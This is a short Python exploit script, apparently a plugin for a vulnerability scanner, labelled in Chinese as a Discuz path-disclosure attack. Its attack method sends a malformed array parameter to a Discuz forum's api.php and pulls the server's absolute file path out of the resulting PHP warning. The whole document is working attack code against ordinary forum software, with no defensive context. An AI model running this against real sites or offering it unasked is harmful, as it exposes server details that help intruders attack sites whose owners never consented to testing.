# coding:utf-8
# discuz 爆路径
import requests,re

class Exploit:

    def attack(self,url):
        req = requests.get(url+'/api.php?mod[]=Seay')
        if req.status_code == 200:
            m = re.search(r'<b>Warning</b>:[^\r\n]+or an integer in <b>([^<]+)api\.php</b> on line <b>(\d+)</b>', req.text)
            if m:
                return m.group(1)